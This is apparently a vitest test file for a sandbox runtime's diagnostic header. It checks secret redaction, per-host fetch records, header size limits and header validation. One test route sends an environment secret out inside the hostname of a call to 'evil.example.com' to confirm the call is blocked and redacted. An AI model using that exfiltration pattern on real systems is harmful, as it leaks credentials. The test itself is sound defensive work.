import { describe, expect, it, vi } from "vitest"

import type { AppPlan } from "@/lib/agent-protocol"
import { generatedServerFiles } from "@/lib/generated-app/server-files"
import type { RuntimeBundle } from "@/lib/sandbox/bundle"
import {
  DIAGNOSTIC_HEADER,
  MAX_DIAGNOSTIC_HEADER_LENGTH,
  decodeDiagnostic,
  encodeDiagnostic,
  sanitizeDiagnostic,
  type CallDiagnostic,
} from "@/lib/sandbox/diagnostic"
import { compileServerFile } from "@/lib/sandbox/routes"
import { createDispatcher } from "@/sandbox-runtime/dispatch"
import { createVmEvaluator } from "@/sandbox-runtime/evaluate"

const KEY = "sk-proj-" + "a".repeat(40)
const PLAIN_SECRET = "hunter2-hunter2-hunter2"
const env = { OPENAI_API_KEY: KEY, PLAIN: PLAIN_SECRET, NODE_ENV: "production" }

const respondSource = generatedServerFiles({
  serverRoutes: [{ id: "probe", path: "app/api/probe+api.ts", purpose: "p", kind: "function", services: [], access: "public" }],
} as unknown as AppPlan).find((file) => file.path === "server/respond.ts")!.code

function bundleOf(sources: Record<string, string>): RuntimeBundle {
  const all = { "server/respond.ts": respondSource, ...sources }
  const files: Record<string, string> = {}
  for (const [path, code] of Object.entries(all)) files[path] = compileServerFile(path, code)
  return {
    files,
    routes: Object.keys(sources).filter((path) => path.endsWith("+api.ts")),
    allowedHosts: ["api.apify.com"],
    secretNames: ["OPENAI_API_KEY", "PLAIN"],
  }
}

type Upstream = (url: string) => Promise<Response>

function runner(sources: Record<string, string>, upstream: Upstream = async () => Response.json({ ok: true }), vm = false) {
  const dispatch = createDispatcher(bundleOf(sources), {
    env,
    fetch: vi.fn(upstream) as unknown as typeof fetch,
    ...(vm ? { evaluate: createVmEvaluator() } : {}),
  })
  return async () => {
    const response = await dispatch(new Request("http://localhost/api/probe", { method: "POST" }))
    const header = response.headers.get(DIAGNOSTIC_HEADER)
    return { response, text: await response.text(), header, diagnostic: decodeDiagnostic(header) }
  }
}

const GENERIC = { error: { code: "unavailable", message: "Something went wrong. Try again." } }

describe("the runtime's diagnostic", () => {
  it.each([
    ["the shadow evaluator", false],
    ["the vm evaluator", true],
  ])("hides a secret thrown in withErrors, in every form, and leaves the app's answer generic (%s)", async (_name, vm) => {
    const base64 = Buffer.from(KEY).toString("base64")
    const hex = Buffer.from(PLAIN_SECRET).toString("hex")
    const call = runner(
      {
        "app/api/probe+api.ts": `import { withErrors } from "@/server/respond"
export const POST = withErrors(async () => {
  throw new TypeError("Bad: " + process.env.OPENAI_API_KEY + " / ${base64} / " + encodeURIComponent(process.env.PLAIN) + " / ${hex} / zz sk-live-" + "b".repeat(30))
})`,
      },
      undefined,
      vm
    )
    const { response, text, header, diagnostic } = await call()

    expect(response.status).toBe(500)
    expect(JSON.parse(text)).toEqual(GENERIC)
    expect(diagnostic?.thrown?.name).toBe("TypeError")
    const message = diagnostic?.thrown?.message ?? ""
    for (const leak of [KEY, base64, PLAIN_SECRET, hex, "bbbbbbbbbb", Buffer.from(KEY).toString("base64url")]) {
      expect(message).not.toContain(leak)
      expect(Buffer.from(header ?? "", "base64url").toString()).not.toContain(leak)
    }
    expect(message).toContain("[hidden]")
    expect(message.startsWith("Bad: ")).toBe(true)
    expect(message.length).toBeLessThanOrEqual(200)
  })

  it("keeps only the first line of a message, cut to 200 characters", async () => {
    const call = runner({
      "app/api/probe+api.ts": 'export function POST() { throw new Error("a".repeat(500) + "\\nsecond line") }',
    })
    const { diagnostic } = await call()
    expect(diagnostic?.thrown).toEqual({ name: "Error", message: "a".repeat(200) })
  })

  it("explains an error thrown outside withErrors too", async () => {
    const call = runner({ "app/api/probe+api.ts": "export function POST() { return undefined.items }" })
    const { response, text, diagnostic } = await call()
    expect(response.status).toBe(500)
    expect(JSON.parse(text).error.message).toBe("The server function failed.")
    expect(diagnostic?.thrown?.name).toBe("TypeError")
  })

  it("records a 401 upstream by host only and the blocked host, with the app's answer unchanged", async () => {
    const seen: string[] = []
    const call = runner(
      {
        "app/api/probe+api.ts": `import { withErrors } from "@/server/respond"
export const POST = withErrors(async () => {
  const run = await fetch("https://api.apify.com/v2/acts/x/runs?token=" + process.env.OPENAI_API_KEY, { headers: { authorization: "Bearer " + process.env.OPENAI_API_KEY } })
  if (!run.ok) {
    try { await fetch("https://api.apify-storage.com/key-value-stores/abc") } catch {}
    throw new Error("Apify answered " + run.status)
  }
})`,
      },
      async (url) => {
        seen.push(url)
        return new Response("nope", { status: 401 })
      }
    )
    const { response, text, header, diagnostic } = await call()

    expect(seen).toHaveLength(1)
    expect(response.status).toBe(500)
    expect(JSON.parse(text)).toEqual(GENERIC)
    expect(diagnostic?.fetches).toEqual([
      { host: "api.apify.com", status: 401, ms: expect.any(Number) },
      { host: "api.apify-storage.com", error: "blocked", ms: expect.any(Number) },
    ])
    expect(diagnostic?.thrown).toEqual({ name: "Error", message: "Apify answered 401" })
    const decoded = Buffer.from(header ?? "", "base64url").toString()
    expect(decoded).not.toMatch(/\/v2|token|authorization|Bearer|abc|sk-proj/i)
    expect(header!.length).toBeLessThanOrEqual(MAX_DIAGNOSTIC_HEADER_LENGTH)
  })

  it("records network failures and timeouts", async () => {
    const call = runner(
      {
        "app/api/probe+api.ts": `export async function POST() {
  await fetch("https://api.apify.com/a").catch(() => {})
  await fetch("https://api.apify.com/b").catch(() => {})
  return Response.json({ ok: true })
}`,
      },
      async (url) => {
        if (url.endsWith("/b")) throw Object.assign(new Error("slow"), { name: "TimeoutError" })
        throw new TypeError("fetch failed")
      }
    )
    const { diagnostic } = await call()
    expect(diagnostic?.fetches.map((fetch) => fetch.error)).toEqual(["network", "timeout"])
  })

  it("marks a fetch that never answered as timed out when the whole call times out", async () => {
    const dispatch = createDispatcher(bundleOf({ "app/api/probe+api.ts": 'export async function POST() { await fetch("https://api.apify.com/slow") }' }), {
      env,
      fetch: (() => new Promise(() => {})) as unknown as typeof fetch,
      timeoutMs: 30,
    })
    const response = await dispatch(new Request("http://localhost/api/probe", { method: "POST" }))
    expect(response.status).toBe(504)
    expect(decodeDiagnostic(response.headers.get(DIAGNOSTIC_HEADER))?.fetches).toEqual([{ host: "api.apify.com", error: "timeout", ms: expect.any(Number) }])
  })

  it("records only the first 10 outgoing calls", async () => {
    const call = runner({
      "app/api/probe+api.ts": 'export async function POST() { for (let i = 0; i < 15; i++) await fetch("https://api.apify.com/" + i); return Response.json({}) }',
    })
    const { diagnostic } = await call()
    expect(diagnostic?.fetches).toHaveLength(10)
  })

  it("adds the header to a success and never lets the app set it", async () => {
    const call = runner({
      "app/api/probe+api.ts": `export async function POST() {
  await fetch("https://api.apify.com/ok")
  return new Response("{}", { headers: { "${DIAGNOSTIC_HEADER}": "forged" } })
}`,
    })
    const { response, diagnostic } = await call()
    expect(response.status).toBe(200)
    expect(response.headers.get(DIAGNOSTIC_HEADER)).not.toBe("forged")
    expect(diagnostic).toMatchObject({ fetches: [{ host: "api.apify.com", status: 200 }] })
  })

  it("is on early errors as well", async () => {
    const call = runner({ "app/api/other+api.ts": "export function POST() { return Response.json({}) }" })
    const { response, diagnostic } = await call()
    expect(response.status).toBe(404)
    expect(diagnostic).toMatchObject({ fetches: [] })
  })

  it("hides a secret placed in the host of a blocked call", async () => {
    const call = runner({
      "app/api/probe+api.ts": 'export async function POST() { await fetch("https://" + process.env.PLAIN + ".evil.example.com/").catch(() => {}); return Response.json({}) }',
    })
    const { header, diagnostic } = await call()
    expect(diagnostic?.fetches).toEqual([{ host: "redacted", error: "blocked", ms: expect.any(Number) }])
    expect(Buffer.from(header ?? "", "base64url").toString()).not.toContain(PLAIN_SECRET)
  })
})

describe("the diagnostic's shape", () => {
  const good: CallDiagnostic = {
    ms: 12,
    fetches: [{ host: "api.apify.com", status: 401, ms: 5 }, { host: "x.example.com", error: "blocked", ms: 0 }],
    thrown: { name: "TypeError", message: "boom" },
  }

  it("round-trips through the header", () => {
    expect(decodeDiagnostic(encodeDiagnostic(good))).toEqual(good)
  })

  it("trims what doesn't fit and never exceeds 2 KB", () => {
    const big: CallDiagnostic = {
      ms: 1,
      fetches: Array.from({ length: 10 }, (_, i) => ({ host: `${"h".repeat(60)}${i}.example.com`, status: 200, ms: 1 })),
      thrown: { name: "E".repeat(60), message: "é".repeat(200) },
    }
    const encoded = encodeDiagnostic(big)
    expect(encoded.length).toBeLessThanOrEqual(MAX_DIAGNOSTIC_HEADER_LENGTH)
    expect(decodeDiagnostic(encoded)).not.toBeNull()
  })

  it.each([
    ["not an object", "x"],
    ["no fetches", { ms: 1 }],
    ["a negative time", { ms: -1, fetches: [] }],
    ["a host with a path", { ms: 1, fetches: [{ host: "a.com/x", ms: 1 }] }],
    ["a host with a query", { ms: 1, fetches: [{ host: "a.com?t=1", ms: 1 }] }],
    ["a host over 253 characters", { ms: 1, fetches: [{ host: "a".repeat(254), ms: 1 }] }],
    ["a fractional status", { ms: 1, fetches: [{ host: "a.com", status: 200.5, ms: 1 }] }],
    ["a string status", { ms: 1, fetches: [{ host: "a.com", status: "200", ms: 1 }] }],
    ["an unknown error", { ms: 1, fetches: [{ host: "a.com", error: "oops", ms: 1 }] }],
    ["11 fetches", { ms: 1, fetches: Array.from({ length: 11 }, () => ({ host: "a.com", ms: 1 })) }],
    ["a long thrown message", { ms: 1, fetches: [], thrown: { name: "E", message: "m".repeat(201) } }],
    ["a long thrown name", { ms: 1, fetches: [], thrown: { name: "E".repeat(61), message: "m" } }],
    ["a thrown without a message", { ms: 1, fetches: [], thrown: { name: "E" } }],
  ])("rejects %s", (_name, value) => {
    expect(sanitizeDiagnostic(value)).toBeNull()
  })

  it("drops unknown fields", () => {
    expect(sanitizeDiagnostic({ ms: 1, fetches: [{ host: "a.com", ms: 1, url: "https://a.com/secret" }], body: "x" })).toEqual({
      ms: 1,
      fetches: [{ host: "a.com", ms: 1 }],
    })
  })

  it("ignores a malformed or oversized header", () => {
    expect(decodeDiagnostic(null)).toBeNull()
    expect(decodeDiagnostic("not base64 !!")).toBeNull()
    expect(decodeDiagnostic("e30")).toBeNull()
    expect(decodeDiagnostic("A".repeat(MAX_DIAGNOSTIC_HEADER_LENGTH + 1))).toBeNull()
    const huge = Buffer.from(JSON.stringify({ ms: 1, fetches: [], thrown: { name: "E", message: "m".repeat(5000) } })).toString("base64url")
    expect(decodeDiagnostic(huge)).toBeNull()
  })
})
